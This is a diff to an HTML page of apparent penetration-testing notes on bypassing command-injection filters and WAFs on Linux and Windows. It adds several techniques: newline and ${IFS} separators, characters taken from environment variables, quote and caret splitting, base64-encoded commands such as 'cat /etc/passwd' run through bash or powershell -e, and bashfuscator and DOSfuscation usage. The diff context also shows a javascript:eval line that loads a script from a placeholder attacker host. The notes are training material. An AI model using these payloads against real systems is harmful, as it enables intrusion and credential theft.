@@ -311,7 +311,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
  
                     </th>
                     <td>%0a</th>
-                    <td><b>(Just press enter don't complicate your life typing \n)</b></th>
+                    <td><b>(Just press enter don't complicate your life typing \n). When trying this on a GET request simply write the URL-Encoded char. When doing it on post you can press enter</b></th>
                 </tr>
                 <tr>
                     <td>TAB</th>
@@ -344,9 +344,9 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
                     <td>The Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces</th>
                 </tr>
                 <tr>
-                    <td>%0a${IFS}</th>
-                    <td>%0a${IFS}</th>
-                    <td>It is Linux environment variable tha may also work since its default value it is space and tab. In this case it works because the tested app could be bypassed with %0a$</th>
+                    <td>${IFS}</th>
+                    <td>${IFS}</th>
+                    <td>It is Linux environment variable tha may also work since its default value it is space and tab. This one can be used as a replacement for the "space" char when trying to separate commands</th>
                 </tr>
                 <tr>
                     <td>``</th>
@@ -361,9 +361,12 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
                 </tbody>
                 </table>
 
+                
+
                 <h3>Advanced bypassing</h3>
                 <h4>Linux</h4>
                 <ul>
+                <h5>Simple chars</h5>
                 <p>With the use of env variables we are able to extract chars from there for example. In case we print the PATH in a Linux box</p>
                 <pre><code class="language-bash">echo ${PATH}
 /usr/local/bin:/usr/bin:/bin:/usr/games</code></pre>
@@ -373,30 +376,98 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
                 <p>Here is another example but with <b>;</b></p>
                 <pre><code class="language-bash">${LS_COLORS:10:1}</code></pre>    
                 
+                <p>Here is a example of where we are trying to list the home directory.</p>
+                <pre><code class="language-bash">${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
+#the command result in the victim sistem is: (Have in mind that ${IFS} is used when space is blocked and you need to separate the commands)
+;
+ls -la /home</code></pre>
+                <br> 
+                <h5>Commands</h5>
+                <p>In some cases will find that specific commands like <b>whoami or ls</b> are blacklisted in this cases we can use quotes or double quotes to bypass it</p>
+                <p>These quotes must always be even (par),can be positioned in any place of the string, and we can't mix diferent types of quotes</p>  
+                <pre><code class="language-bash">w'h'o'am'i
+w"h"o"am"i</code></pre>
+                <p>Other examples are with the use of <b>$@ or /</b>which can are avoided by bash and let us execute the commands without issues</p>
+                <pre><code class="language-bash">who$@ami
+w\ho\am\i</code></pre>
+                <p>Or in case you are treating with a WAF you would try to offuscate your input changing some letters</p>
+                <pre><code class="language-bash">WhOaMi</code></pre>        
+                <pre><code class="language-bash">$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(rev<<<'imaohw')  #Reverting command</code></pre>
+                <br>    
+                <h5>Encoding</h5>
+                <p>This way, it is much less likely to be denied by a filter or a WAF. In this case we will create our own command by using the following:</p>
+                <pre><code class="language-bash">echo -n 'cat /etc/passwd' | base64 </code></pre>
+                <p>Now decode and execute the command</p> 
+                <pre><code class="language-bash">bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dk)</code></pre>     
+
+                
+                   
                 </ul>
                 
                 <h4>Windows</h4>
                 <ul>
                 <h5>CMD</h5>
-                <ul>    
+                <ul>
+                <h5>Simple chars</h5>    
                 <p>Same process can be achieved with Windows operating systems.</p>
                 <p>Based on the following result which allow us to check the current path</p>
-                <pre><code class="language-bash">echo %HOMEPATH%
+                <pre><code class="language-cmd">echo %HOMEPATH%
 \Users\htb-student</code></pre>
                 <p>We can extract an slash "/" by doing. Which internally is selecting the 6th char and then substracting the last 11 chars</p>
-                <pre><code class="language-bash">echo %HOMEPATH:~6,-11%</code></pre>    
+                <pre><code class="language-cmd">echo %HOMEPATH:~6,-11%</code></pre>    
+                <br>
+                <h5>Commands</h5>    
+                <p>In some cases will find that specific commands like <b>whoami or dir</b> are blacklisted in this cases we can use the caret char</p>
+                <pre><code class="language-cmd">who^ami</code></pre>
+                <p>Or in case you are treating with a WAF you would try to offuscate your input changing some letters</p>
+                <pre><code class="language-cmd">WhOaMi</code></pre>    
                 </ul>
 
                 <h5>Powershell</h5>
                 <ul>
                     <p>An easy process can be performed in Windows powershell. You can list the current path by doing</p>
                     <ul>
-                        <pre><code class="language-bash">$env:HOMEPATH</code></pre>
+                        <h5>Simple chars</h5>
+                        <pre><code class="language-powershell">$env:HOMEPATH</code></pre>
                         <p>Since in powershell all strings are trated as arrays we can just print a cell of the array by doing the following that will print an slash</p>
-                        <pre><code class="language-bash">$env:HOMEPATH[0]</code></pre>
+                        <pre><code class="language-powershell">$env:HOMEPATH[0]</code></pre>
+                        <br>
+                        <h5>Commands</h5>
+                        <p>Or in case you are treating with a WAF you would try to offuscate your input changing some letters</p>
+                        <pre><code class="language-powershell">iex "$('imaohw'[-1..-20] -join '')"</code></pre>    
+                        <br>
+                        <h5>Encoding</h5>
+                        <p>This way, it is much less likely to be denied by a filter or a WAF. We can convert our string to base64 using</p>
+                        <pre><code class="language-powershell">[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+#OR from linux you can do                            
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64</code></pre>
+                        <p>Then execute it using</p>
+                        <pre><code class="language-powershell">iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+#OR
+powershell.exe -e dwBoAG8AYQBtAGkA</code></pre>
                     </ul>
                 </ul>
             </ul>
+
+                <h3>Automation</h3>
+                <ul>
+                <p>There are some tools which allow us to generate payloads which are ofuscated</p>
+                <p>From the <b>linux</b> side we have <b>bashfuscator</b> here we have some commands to generate simple ofuscated payloads</p>
+                <b>It is very important to test the payload in your system to check if it works properly</b>
+                <pre><code class="language-bash">bashfuscator -c 'cat /etc/passwd' --no-file-write --no-mangling --layers 1
+bashfuscator -c 'cat /etc/passwd' --no-file-write --no-mangling --no-random-whitespace --no-insert-chars --layers 1</code></pre>
+                <p>Then we can base64 the payload and send it to the webserver or other</p>    
+                
+                <p>From the Windows side we have <b>DOSfuscation</b> Go into the folder where you have downloaded and run:</p>
+                <pre><code class="language-powershell">Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation</code></pre>
+                <p>Then set the command you would like to offuscate</p>
+                <pre><code class="language-powershell">SET COMMAND whoami</code></pre>
+                <p>Select the level of ofuscation (1,2,3) and finally run the command in <b>cmd</b>. Here are some examples</p>
+                <pre><code class="language-cmd">%wiNdir:~    -2,      -1%h%SYsTEMroOT:~    -3,     1%%LOCAlAppDaTA:~    -7,    -6%%apPDAtA:~      -4,      1%%appDatA:~     -3,   -2%</code></pre>    
+                </ul>
+                
 
                 <h3>Situations</h3>
                 <ul>
